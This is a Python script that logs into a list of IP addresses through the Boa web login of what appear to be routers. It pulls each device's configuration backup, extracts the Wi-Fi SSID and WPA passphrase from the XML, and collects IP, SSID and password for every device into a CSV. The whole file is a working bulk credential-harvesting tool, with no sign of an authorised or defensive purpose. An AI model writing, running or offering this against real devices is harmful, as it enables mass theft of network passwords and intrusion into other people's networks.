import os
import requests
import csv
import xml.etree.ElementTree as ET
import logging
from dotenv import load_dotenv
import configparser

load_dotenv()

username = os.getenv("BOA_USERNAME")
password = os.getenv("BOA_PASSWORD")

logging.basicConfig(level=logging.INFO)

# Load config properties
config = configparser.ConfigParser()
config.read(os.path.join(os.path.dirname(__file__), '..', '.config.properties'))

BOA_XML_FOLDER = config.get('folders', 'boa_xml_folder', fallback='./boa_xml')
CSV_FOLDER = config.get('folders', 'csv_folder', fallback='./csv')


def send_login_request(session, ip):
    """Sends a login request to the specified IP address."""
    url = f"http://{ip}/boaform/webLogin"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": f"http://{ip}",
        "Connection": "keep-alive",
        "Referer": f"http://{ip}/login.asp",
    }
    data = {"username": username, "password": password}

    response = session.post(url, headers=headers, data=data)
    response.raise_for_status()  # Raise an exception if the request fails
    logging.info(f"Login request sent successfully to {ip}")


def send_download_request(session, ip):
    """Sends a download request to the specified IP address."""
    url = f"http://{ip}/boaform/settingConfig"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": f"http://{ip}",
        "Connection": "keep-alive",
        "Referer": f"http://{ip}/page/config.asp?0",
        "Upgrade-Insecure-Requests": "1",
    }
    data = {"config_backup": "Backup"}

    response = session.post(url, headers=headers, data=data)
    response.raise_for_status()  # Raise an exception if the request fails

    filename = f"{ip}.xml"
    os.makedirs(BOA_XML_FOLDER, exist_ok=True)
    file_path = os.path.join(BOA_XML_FOLDER, filename)
    with open(file_path, "wb") as file:
        file.write(response.content)
    logging.info(f"Downloaded file saved: {file_path}")


def main():
    """Main function that sends login and download requests to a list of IP addresses."""
    with requests.Session() as session:
        with open("./ips/boa.txt", "r") as file:
            ip_list = file.read().splitlines()

        for ip in ip_list:
            try:
                send_login_request(session, ip)
                send_download_request(session, ip)
            except requests.RequestException as e:
                logging.error(f"Failed to send requests to {ip}: {str(e)}")


def parse_xml_files(directory):
    """Parses XML files in a directory and returns a list of (SSID, KeyPassphrase) tuples."""
    ssid_key_pairs = []

    # Iterate over all files in the directory
    for filename in os.listdir(directory):
        if filename.endswith(".xml"):
            file_path = os.path.join(directory, filename)

            try:
                # Parse the XML file
                tree = ET.parse(file_path)
                root = tree.getroot()

                # Find the SSID and KeyPassphrase elements
                ssid_element = root.find(".//Value[@Name='SSID']")
                keypassphrase_element = root.find(".//Value[@Name='WSC_PSK']")

                # Extract the values if elements are found
                if ssid_element is not None and keypassphrase_element is not None:
                    ssid = ssid_element.attrib["Value"]
                    keypassphrase = keypassphrase_element.attrib["Value"]

                    ssid_key_pairs.append((ssid, keypassphrase))
            except ET.ParseError as e:
                logging.error(f"Error parsing XML file {file_path}: {str(e)}")

    return ssid_key_pairs


def save_to_csv(pairs, output_file):
    sorted_pairs = sorted(pairs, key=lambda x: x[0])
    with open(output_file, "w", newline="") as file:
        writer = csv.writer(file)
        writer.writerow(["IP", "SSID", "KeyPassphrase"])
        writer.writerows(sorted_pairs)


if __name__ == "__main__":
    try:
        main()
        directory_path = BOA_XML_FOLDER
        output_file = os.path.join(CSV_FOLDER, "boa_pass.csv")

        pairs = parse_xml_files(directory_path)

        # Add IP address to each pair
        ip_list = [
            file_name[:-4]
            for file_name in os.listdir(directory_path)
            if file_name.endswith(".xml")
        ]
        pairs_with_ip = [
            (ip, ssid, keypassphrase)
            for ip, (ssid, keypassphrase) in zip(ip_list, pairs)
        ]

        save_to_csv(pairs_with_ip, output_file)
    except Exception as e:
        logging.error(f"An error occurred: {str(e)}")